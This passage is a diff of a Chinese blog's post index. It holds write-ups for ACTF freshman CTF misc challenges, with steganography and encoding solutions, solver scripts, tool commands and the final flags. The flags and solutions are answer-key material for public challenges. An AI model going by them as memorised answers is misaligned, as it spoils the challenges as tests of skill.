+<p>对比两个包</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203046943.png"></p>
+<p>两个包的CRC是一样的</p>
+<p>进行爆破</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203155571.png"></p>
+<h1 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h1><p>[ACTF新生赛2020]近在眼前</p>
+<h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>base64隐写</li>
+</ul>
+<h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/zxy13/Desktop/2022311/10/近在眼前/ComeOn!.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line[:-<span class="number">1</span>]</span><br><span class="line">        num = line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        lastchar = line[-(num + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(line,num,lastchar)</span></span><br><span class="line">        myindex = base64chars.index(lastchar)</span><br><span class="line">        <span class="comment"># print(myindex)</span></span><br><span class="line">        bin_str = <span class="built_in">bin</span>(myindex)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># print(bin_str)</span></span><br><span class="line">        flag += bin_str[<span class="number">6</span> - <span class="number">2</span> * num:]</span><br><span class="line">        <span class="comment"># print(bin_str[6-2*num:])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>)]))</span><br></pre></td></tr></table></figure>
+
+<p>运行得到</p>
+<p><strong><code>ACTF&#123;6aseb4_f33!&#125;</code></strong></p>
 ]]></content>
       <categories>
-        <category>服务器</category>
+        <category>杂项</category>
       </categories>
       <tags>
-        <tag>内网穿透</tag>
-        <tag>虚拟机</tag>
-        <tag>服务器</tag>
+        <tag>Misc</tag>
       </tags>
   </entry>
   <entry>
@@ -363,173 +487,95 @@
       </tags>
   </entry>
   <entry>
-    <title>Misc小合集（一）</title>
-    <url>/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次杂项小训练</p>
-<p><strong>Misc 1</strong> - <strong>Misc 10</strong></p>
+    <title>win10内网穿透</title>
+    <url>/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是我在探索服务器路上的一次记录，为了就是先去了解服务器。方便自己尝试，这篇文章也是参考许多大佬的文章。希望可以给你提供一点帮助。</p>
 <span id="more"></span>
 
-<h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h1><p>[ACTF新生赛2020]frequency</p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>strings</li>
-<li>word隐藏文字</li>
-<li>字频统计</li>
+<h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><ul>
+<li>Windows镜像</li>
+<li>VM16虚拟机</li>
+<li>花生壳8</li>
+<li>宝塔</li>
 </ul>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先用string命令查看文件，得到两段可疑代码</p>
-<p>使用下面的一段，看起来像base64码</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312124955095.png"></p>
-<p>在Word里面，显示隐藏文字和解除隐藏。文字无法复制，但是我发现可以通过剪切出。</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125607111.png"></p>
-<p>也可以通过解除隐藏复制</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125914279.png"></p>
-<p>将它们组合起来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a2draGxmY290bnRpdWZwZ2hodGN3dWprY2ttb3ducGNrbXdseWd0bHBtZmtneWFhaWh1Y2RsYXRveXVjb2lnZ3JwbGt2a2Ftcmt0cXp4ZW1taXdrbGh1YWVrY2VvbHBvY2ZtdGFobWdmbWF2YWpuYmNwbWx0anRwdWZqY2FwY3RvanBqYmZmYmpid2h1YWxnZ3lqbmFtY2JmeWFjamJheGtpeGxtbXFpa3NtcHRxeW9qZXJ0ZmVrdGR4ZHh4YnRyeGNhbmd5bXNpbWh2dXdrdGV4c2dscnRwZ2FrdGJtZnVjZ3ZubXRqdWZvZWt5bXRsaW14ZGlqanB4eWl0YWJwbWt1Y2NubGtwb2V0Z2NkY3Bvc2tpenZ5eHJ0enhyYXh0bm9paHFjeGZvYWFhbHBhanlja2VrYnljZnZqb21sbGthamd5bWdmZGNycGVxa2xmc2NtZWppY3BqaWtjcHBhY3h5ZXZma3ljcHBia2R6Y2ZsbGlrcW5pdGNrYmhqb3JuZGhzb21mdHlwYWhwcW94cnlpbWhmbGNoY21rb3JldG1yb3RrYXJjanRobWZ0aWxpam55a3V0aWhienR0dW1zbmdmdGxtcmJmZmx0ZndjbmptZmF0bGZiemxva3RscHBsbWZpY29rcHBucGFjbWZ1Z21wdW5kdnRvbXdldmNqc2dhamdmZXF1dXBhaWV0eW5mamJicGpzbHZ5bmFmdG1scHBka3R0b2Z1emppanhpdGJmaXJtb3ZwemVraXJic2Zqc2d6bHVrb2x5dm9obXZnY3BrdGhzeGZ6bW1ibm1sZHp5dWljZHZrbXpiYXlidG9yY2ZvdHRkYW1jY25iYXBucmd4bGN5cGh5Zm5jZXhidmRubG9rZ295aWxwcmxvbnNodGNranR4bmFiamhsbWJwZGNtaGtqbmxnbXRnam5qYWtyaXpsbHBtbWFscHhhbXVuaW51cGtwZGlhcHNzbXZrZGp2Z2l5b2R1bXBuYXBsamtqYmNmaHRoc2tpb2twZ3R0eWhubmRzeGtxanp2dmRvc2VwcG9pZ3l0bW5uYXZjdG9wZHlpeHZiZG9zb2JtY3ViaXVhanhoeWZrdnJremdjdXlpbHB2YXdheW5xYWFwbGJrd2lpeHJjdGN0bGt4ZmpscGVhbW1qbmF1amNvdWlmbXZpa2ZpbXJvYXF0Y3RjZm1hdWJnYWdva2FyZnFmaGVtb3NydHlmb3B1a3VkY2FhaW1oZGZvZ25oa3JjZWxwY2F0Y3RweWpsYXZva2xnY2xhdGx0bXR6eWdwZWhma3poY3R6bmdtb2ZjaXpsdm54dG5sdWFqbHRvdmNqYWp1YnphdHBlaGhma25uZ2dwbHlsaXZmZWFpZHJteWp0YWNhbXhjbmtmeXN0d2ZuZmx5bmJta2NrYXJ4YWlzcGpsa3ZjdHZrbHh1bmNmcGJ4dmlyaXFleXBtdXZ1bHZsamNrY3lwcHRwdmV0b3hobWlwYmlsbmplb3drd3VjdG9rbmFmcHdvYXBmdGNsemhwaHhjY2F0dGh1bXZ3aHpvbWFmd3Fxbmxzb3lhYnV0bHpwaWF0Zm1tYWprcmR2bGN6d2pwc3Nwb2FiaWZpcGhrb2NocHRrYXRrYWZlb255YmZpdmVjbGR6b2ZhdGV0Z2FsaGFmYW1vYXlvc291bm5hZmlhdGNqdGl3b29sYWNya2N1YWRwdXRreWxweXBiZ2ZlcHdwc25jd2tjd2xsYXJ5anNjYW5id3BkcHpicHR1dG5sbm9wd3BpdGJsb3RsbHppZmtsYWF1cmpwaWFqZnB0a2ZteHBic3VjdmpzZ21jYWxhbnRyc2NrYmt1eWZnYWFrZmFjbmxkdXZxZXR5amdqbW5hZWFjbmdheGNuYW1qbWlna2tpdW1sbmR3Y2ttdWFuYW52cnJiZnp4enl1dWVob25lbWxjanp1dm9hanVmZGdqampjZ21ucHRmdXVjdWJjdGpoYW1sb2xmaG9pZnZia2themNwb3pjeXVjYnJnb2picG5haGNneXV0dGR2bXR0dndqbWhic2ptYmJhdmNkbHlob3Fqb21wY3B2aHRrb2FpcnZ0bWtmZnlhdGttcHR1dW9vb2xncG5udWVsaGZodnZpc3Vrd3lubWlhY25sbHVtaHRqZWt1YXV1cGxyeGtpZXB1anhsaWNma2NiY2htbmdsZ3BsaWhteWNybnNvbWF3dWZ1b29tdXVuaGRvb2FydWRhbW9hbW9ocW9vY2Z1cGp1aWFieHh1dnl2bm9zb3Vvb3Zha2xjZmt0eXJmYWdmYXl2cHVmdnBiZ3RhZmVraXBpY292dGZ0bnV4c2phdmpkcWt2ZnVpa2x0bWRrYmJua3BhZnhycXBmZ2N0dmFzY3VqamN1Y2h1YXpjaXVtdHRkbmF3aWhtbW9qZmJoeHZvbXRmcGJmaHR2aXdsYXVlb2dwcG1qc3BjYWxmaGNhcmtsYmlzcGh0anBhbmhsaXNwbnRza2tjbGpnZ2tjenRmaG5lY25wdGlmZnRyZG10amZla2ZpdGthc2RnbmVscHVoYmZpbXB1Y2JrcGtjbXhsZmtwaWlqdmh0amtzeWx6cm9vZmFjeGNscGpuaGJpcmN5ZGp0Y2xqZG9ibHlyeW1hdGdoaWZvam1qanNla29vbW9mY2FjdGF2ZmN5Zm11Znhoc3Rqd3VwYmpreW9nbnlyeXBseXBxbGF5eW1veHRhbnFkcHVyYnd6cGxsb2traGhtYW5kam5hdGNibGtjb3Rna2x1dHR3YmRhdHFybWF6cHJ2YXd6anhlZmhqdGRraWt1cmxsY2xjam9naG1sd3RhbWRkY2NucXVyb3Jha2N5b2JsYXJ6YWNtbnFjbWV0dHVheWF1eWl2c21ma25uYW5sdGNtaWdmcmdhYmlwdG50aG1tdXRwaWJ5bHJhdGhqY2doY2ZtbG92cGNudHFwZW96bG90ZGtlaW9jZmtjaXZ1eWx6Ympvb3hjc2FjbmdkdXZ4dG50aGphZXBhdX1rbGFocGNtdnppY2twYWFwaG9jZ2lvZ2p0dnB0Z2poZG9udW5scGFvbG5kcWJxZmRtYnBqam94Ym9tbGlreXVpcG54cXh6Y2lmb3JhaGhldXl5dHpoanV0Z2Z3dHVscmpjZnhvaWFneWpmYnBqaWFrZ3l0eGJmbnBsZnBxd3RkaXFuaXR2dmF1amRqbGlmamlvcnltdmZ4bXhnb3JpY3ljZGZob2ZiYnlnZmxhdGlyamRpZGFkcXZpa2pvY2l5ZmR6aHJvZ255eWlia2dubnZobWpsb2xhdndmaWpjZ2dma3B0a3BnY3FmYWZheXNpdHltYWN2a3FweWxoaGJ1Ymh4c2x1emN5dmxvcmlwdGxwZmxjdWljcG5mc2hpeXh2a2tiY2p5dWtvdGFsZmNpcGhjZGd4aWZ0a2xkZ29wanNtdXJ0eWp5cGhia2JmbmJ3YnNvZmlheHRsdWhwbXJmZGFrdWx1cGVhcHZyeXhtYWVwaGF5bmV4emZsbmV2am1pYndvcml0aGh4YmJ5cG1tYWJvYmZuZmNvanR0Y3Jram1naXJ2bWlzdW5mbHVodGVudHJodGVvamtjaGtwZnBhZXNnd2dscWRrdnZudWx1bnF7bG1sdGFscGhvdWZqcGlhbGNmbGZ5ZHZmd3lkb2ZraGFpeWF3bGx3Y2pvYXJxdnpqbGZmZ2xjdGNsYmxwa2JzZmxocnRqZGFvd3ByZGJjdWJmbHlveWJodmh3ZndvZWl0Z254YnpuaWZwbGx4bXN0a251aWhvYmZlZWZra2FreW5uYWNra2NkdWFtZ3N2bnBoY3RmZ3NybnJvZWh2ZW5kYmZpb21xZm14Ym1paWl1bGF2b2dma2dhY2lrYWFtcHBybGpmbXBqY3VhYXNja2l1cWlmY2liamx1dGNtcGF0b2pyanZmeGdsenBvcGpkZ2NoanVqbGtuZnd0cG5qZnBhY3JrcHRmaGNzamdyaXBjcmZjZGFsem5ob25mZGNvaG9zZmhvaGVha250aXRtamZsbmJvcGNsY3hjdWlnb3hja3JiYWxyYWVidGFhcml0ZWZtemNxaWRvZmd0ZnFnYmFkaWNubWhvdGlvbm9iZnlubGdvenRkYXZ2aW14b2JvdGlra2Z4d2lyb3JwZmNjdXpob3BoZmRjaWVrY2p5b21lamtjZ2Zmam51bmhvcGFkdGZndG1sdA==</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>进行base64解码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kgkhlfcotntiufpghhtcwujkckmownpckmwlygtlpmfkgyaaihucdlatoyucoiggrplkvkamrktqzxemmiwklhuaekceolpocfmtahmgfmavajnbcpmltjtpufjcapctojpjbffbjbwhualggyjnamcbfyacjbaxkixlmmqiksmptqyojertfektdxdxxbtrxcangymsimhvuwktexsglrtpgaktbmfucgvnmtjufoekymtlimxdijjpxyitabpmkuccnlkpoetgcdcposkizvyxrtzxraxtnoihqcxfoaaalpajyckekbycfvjomllkajgymgfdcrpeqklfscmejicpjikcppacxyevfkycppbkdzcfllikqnitckbhjorndhsomftypahpqoxryimhflchcmkoretmrotkarcjthmftilijnykutihbzttumsngftlmrbffltfwcnjmfatlfbzloktlpplmficokppnpacmfugmpundvtomwevcjsgajgfequupaietynfjbbpjslvynaftmlppdkttofuzjijxitbfirmovpzekirbsfjsgzlukolyvohmvgcpkthsxfzmmbnmldzyuicdvkmzbaybtorcfottdamccnbapnrgxlcyphyfncexbvdnlokgoyilprlonshtckjtxnabjhlmbpdcmhkjnlgmtgjnjakrizllpmmalpxamuninupkpdiapssmvkdjvgiyodumpnapljkjbcfhthskiokpgttyhnndsxkqjzvvdoseppoigytmnnavctopdyixvbdosobmcubiuajxhyfkvrkzgcuyilpvawaynqaaplbkwiixrctctlkxfjlpeammjnaujcouifmvikfimroaqtctcfmaubgagokarfqfhemosrtyfopukudcaaimhdfognhkrcelpcatctpyjlavoklgclatltmtzygpehfkzhctzngmofcizlvnxtnluajltovcjajubzatpehhfknnggplylivfeaidrmyjtacamxcnkfystwfnflynbmkckarxaispjlkvctvklxuncfpbxviriqeypmuvulvljckcypptpvetoxhmipbilnjeowkwuctoknafpwoapftclzhphxccatthumvwhzomafwqqnlsoyabutlzpiatfmmajkrdvlczwjpsspoabifiphkochptkatkafeonybfivecldzofatetgalhafamoayosounnafiatcjtiwoolacrkcuadputkylpypbgfepwpsncwkcwllaryjscanbwpdpzbptutnlnopwpitblotllzifklaaurjpiajfptkfmxpbsucvjsgmcalantrsckbkuyfgaakfacnlduvqetyjgjmnaeacngaxcnamjmigkkiumlndwckmuananvrrbfzxzyuuehonemlcjzuvoajufdgjjjcgmnptfuucubctjhamlolfhoifvbkkazcpozcyucbrgojbpnahcgyuttdvmttvwjmhbsjmbbavcdlyhoqjompcpvhtkoairvtmkffyatkmptuuooolgpnnuelhfhvvisukwynmiacnllumhtjekuauuplrxkiepujxlicfkcbchmnglgplihmycrnsomawufuoomuunhdooarudamoamohqoocfupjuiabxxuvyvnosouoovaklcfktyrfagfayvpufvpbgtafekipicovtftnuxsjavjdqkvfuikltmdkbbnkpafxrqpfgctvascujjcuchuazciumttdnawihmmojfbhxvomtfpbfhtviwlaueogppmjspcalfhcarklbisphtjpanhlispntskkcljggkcztfhnecnptifftrdmtjfekfitkasdgnelpuhbfimpucbkpkcmxlfkpiijvhtjksylzroofacxclpjnhbircydjtcljdoblyrymatghifojmjjsekoomofcactavfcyfmufxhstjwupbjkyognyryplypqlayymoxtanqdpurbwzpllokkhhmandjnatcblkcotgkluttwbdatqrmazprvawzjxefhjtdkikurllclcjoghmlwtamddccnqurorakcyoblarzacmnqcmettuayauyivsmfknnanltcmigfrgabiptnthmmutpibylrathjcghcfmlovpcntqpeozlotdkeiocfkcivuylzbjooxcsacngduvxtnthjaepau&#125;klahpcmvzickpaaphocgiogjtvptgjhdonunlpaolndqbqfdmbpjjoxbomlikyuipnxqxzciforahheuyytzhjutgfwtulrjcfxoiagyjfbpjiakgytxbfnplfpqwtdiqnitvvaujdjlifjiorymvfxmxgoricycdfhofbbygflatirjdidadqvikjociyfdzhrognyyibkgnnvhmjlolavwfijcggfkptkpgcqfafaysitymacvkqpylhhbubhxsluzcyvloriptlpflcuicpnfshiyxvkkbcjyukotalfciphcdgxiftkldgopjsmurtyjyphbkbfnbwbsofiaxtluhpmrfdakulupeapvryxmaephaynexzflnevjmibworithhxbbypmmabobfnfcojttcrkjmgirvmisunfluhtentrhteojkchkpfpaesgwglqdkvvnulunq&#123;lmltalphoufjpialcflfydvfwydofkhaiyawllwcjoarqvzjlffglctclblpkbsflhrtjdaowprdbcubflyoybhvhwfwoeitgnxbznifpllxmstknuihobfeefkkakynnackkcduamgsvnphctfgsrnroehvendbfiomqfmxbmiiiulavogfkgacikaampprljfmpjcuaasckiuqifcibjlutcmpatojrjvfxglzpopjdgchjujlknfwtpnjfpacrkptfhcsjgripcrfcdalznhonfdcohosfhoheakntitmjflnbopclcxcuigoxckrbalraebtaaritefmzcqidofgtfqgbadicnmhotionobfynlgoztdavvimxobotikkfxwirorpfccuzhophfdciekcjyomejkcgffjnunhopadtfgtmlt</span><br></pre></td></tr></table></figure>
-
-<p>frequency有频率的意思，猜测是字频统计</p>
-<p>借用大佬脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#用来统计TXT文本，并统计字频</span></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">r&#x27;C:/Users/zxy13/Desktop/1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取文件所有行</span></span><br><span class="line">content = fr.readlines()</span><br><span class="line">contentLines = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">characers = []  <span class="comment"># 存放不同字的总数</span></span><br><span class="line">rate = &#123;&#125;  <span class="comment"># 存放每个字出现的频率</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次迭代所有行</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">    <span class="comment"># 去除空格</span></span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="comment"># 如果是空行，则跳过</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    contentLines = contentLines + line</span><br><span class="line">    <span class="comment"># 统计每一字出现的个数</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line)):</span><br><span class="line">        <span class="comment"># 如果字符第一次出现 加入到字符数组中</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line[x] <span class="keyword">in</span> characers:</span><br><span class="line">            characers.append(line[x])</span><br><span class="line">        <span class="comment"># 如果是字符第一次出现 加入到字典中</span></span><br><span class="line">        <span class="keyword">if</span> line[x] <span class="keyword">not</span> <span class="keyword">in</span> rate:</span><br><span class="line">            rate[line[x]] = <span class="number">1</span></span><br><span class="line">        <span class="comment"># 出现次数加一</span></span><br><span class="line">        rate[line[x]] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对字典进行倒数排序 从高到低 其中e表示dict.items()中的一个元素，</span></span><br><span class="line"><span class="comment"># e[1]则表示按 值排序如果把e[1]改成e[0]，那么则是按键排序，</span></span><br><span class="line"><span class="comment"># reverse=False可以省略，默认为升序排列</span></span><br><span class="line">rate = <span class="built_in">sorted</span>(rate.items(), key=<span class="keyword">lambda</span> e: e[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;全文共有%d个字&#x27;</span> % <span class="built_in">len</span>(contentLines))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;一共有%d个不同的字&#x27;</span> % <span class="built_in">len</span>(characers))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rate:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[&quot;</span>, i[<span class="number">0</span>], <span class="string">&quot;] 共出现 &quot;</span>, i[<span class="number">1</span>], <span class="string">&quot;次&quot;</span>)</span><br><span class="line"></span><br><span class="line">fr.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">actf&#123;plokmijnuhbygvrdxeszwq&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h1><p>[ACTF新生赛2020]outguess</p>
-<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>outguess</li>
-<li>社会主义核心价值观编码</li>
-</ul>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>在flag.txt中有，猜测是outguess隐写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag在哪？</span><br><span class="line">你Guess一下啊！</span><br></pre></td></tr></table></figure>
-
-<p>在图片的属性中发现：<code>公正民主公正文明公正和谐</code></p>
-<p>解密出来是：<code>abc</code></p>
-<p>使用outguess隐写工具</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">outguess -r mmm.jpg -t 1.txt -k abc   </span><br></pre></td></tr></table></figure>
-
-<p>得到flag：<code>ACTF&#123;gue33_Gu3Ss!2020&#125;</code></p>
-<h1 id="Misc3"><a href="#Misc3" class="headerlink" title="Misc3"></a>Misc3</h1><p>[ACTF新生赛2020]NTFS数据流</p>
-<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>NTFS隐写</li>
-</ul>
-<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>注意：这里解压的时候使用Win RAR解压，涉及NTFS流的都需要Win RAR解压</p>
-<p>工具：Ntfsstreamseditor.exe</p>
-<p>使用工具就可以得到flag了。</p>
-<h1 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h1><p>[ACTF新生赛2020]music</p>
-<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>音频隐写</li>
-<li>异或处理</li>
-</ul>
-<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>音频没有办法打开，显示异常，用010查看</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154611541.png"></p>
-<p>发现根本不符合格式</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154714073.png"></p>
-<p>多次出行相同的字符，猜测是进行了异或，<code>工具-&gt;十六进制运算-&gt;二进制异或</code></p>
-<p>全文进行异或后得到正确文件</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154858601.png"></p>
-<p>得到flag：<code>actfabcdfghijk</code></p>
-<h1 id="Misc5"><a href="#Misc5" class="headerlink" title="Misc5"></a>Misc5</h1><p>[ACTF新生赛2020]wget</p>
-<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>流量分析</li>
-<li>zip伪加密</li>
-</ul>
-<h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>我通过binwalk命令查看到流量包中有存在压缩包，我利用命令分离文件，但是文件损坏</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foremost -T wget.pcapng </span><br></pre></td></tr></table></figure>
-
-<p>我直接在wirshark中直接保存出得到压缩包，但是压缩包需要密码。利用ZipCenOp.jar修复zip压缩包。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar .\ZipCenOp.jar r .\1.zip</span><br></pre></td></tr></table></figure>
-
-<p>解开压缩包得到flag文件</p>
-<p>使用strings命令就可以输出flag：actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p>
-<h1 id="Misc6"><a href="#Misc6" class="headerlink" title="Misc6"></a>Misc6</h1><p>[ACTF新生赛2021]与熊论道</p>
-<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>与熊论道编码</li>
-<li>社会主义核心价值观编码</li>
-<li>bmp图片隐写</li>
-</ul>
-<h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>猜测是和与禅论道一样的编码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">熊曰：呋食性咯怎很盜溫吖盜萌嚄眠嗥吖物和我嘿襲人現擊有嚁嘿襲嗡取果盜和吖非嗷咬和取象洞家食住捕咬嗅拙喜爾常拙捕咯會呦唬沒歡肉咬哞笨註氏破吃咯噤誘嗡唬樣取偶蜜嗒我咬咬嘶盜覺歡我嗡嗅哞麼你和嗄會取喜嗡咬歡象取襲</span><br></pre></td></tr></table></figure>
-
-<p><a href="http://hi.pcmoe.net/">与熊论道</a></p>
-<p>解得：<code>法治富强法治法治公正自由和谐诚信富强和谐民主和谐文明和谐和谐和谐自由和谐平等和谐公正</code></p>
-<p><a href="https://atool.vip/corevalue/">社会主义核心价值观编码</a></p>
-<p>解得：<code>pwd:123456</code></p>
-<p>密码是干嘛用的呢？</p>
-<p>有关bmp图片隐写，我找到两个工具wbStego4.3open和silenteye</p>
-<p>这题用wbStego4.3open就可以解密</p>
-<p><strong><code>ACTF&#123;PXY_wants_@_bOyfri3nd&#125;</code></strong></p>
-<h1 id="Misc7"><a href="#Misc7" class="headerlink" title="Misc7"></a>Misc7</h1><p>[ACTF新生赛2020]你看我匀称吗？</p>
-<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>LSB隐写</li>
-<li>修改图片宽高</li>
-</ul>
-<h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>两个文件一个要密码的压缩包，匀称？猜测高度有问题</p>
-<p>使用工具TweakPNG查看，发现有报错</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313165532165.png"></p>
-<p>用010打开图片修改</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313170605117.png"></p>
-<p>得到：<strong>you come</strong>。解压得到图片</p>
-<p>猜测LSB隐写</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313171718397.png"></p>
-<p>得到flag：**<code>ACTF&#123;llL llsb_i3_e3asY&#125;</code>**</p>
-<h1 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h1><p>[ACTF新生赛2020]剑龙</p>
-<h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>AAencode编码（颜文字）</li>
-<li>steghide隐写</li>
-<li>DES加解密</li>
-<li>stegosaurus（pyc）隐写</li>
-</ul>
-<h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>解开hint文件夹得到一个图片与文本</p>
-<p>文本中是颜文字；<a href="http://www.hiencode.com/aaencode.html">在线解码</a></p>
-<p>得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcom3!</span><br></pre></td></tr></table></figure>
-
-<p>在图片信息中可以看</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313172549463.png"></p>
-<p>key：<code>**@#$%^&amp;%%$)**</code></p>
-<p>hh.jpg是<strong>steghide</strong>隐写</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313183441314.png"></p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1/7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj/Q==</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.sojson.com/encrypt_des.html">DES解密</a></p>
-<p>得到：<strong>think about stegosaurus</strong></p>
-<p>对文件进行file命令，发现是python文件 <strong><code>O_O: python 3.6 byte-compiled</code></strong></p>
-<p>运行命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./stegosaurus -x O_O.pyc </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313190100195.png"></p>
-<p>得到flag：**<code>flag&#123;3teg0Sauru3_!1&#125;</code>**</p>
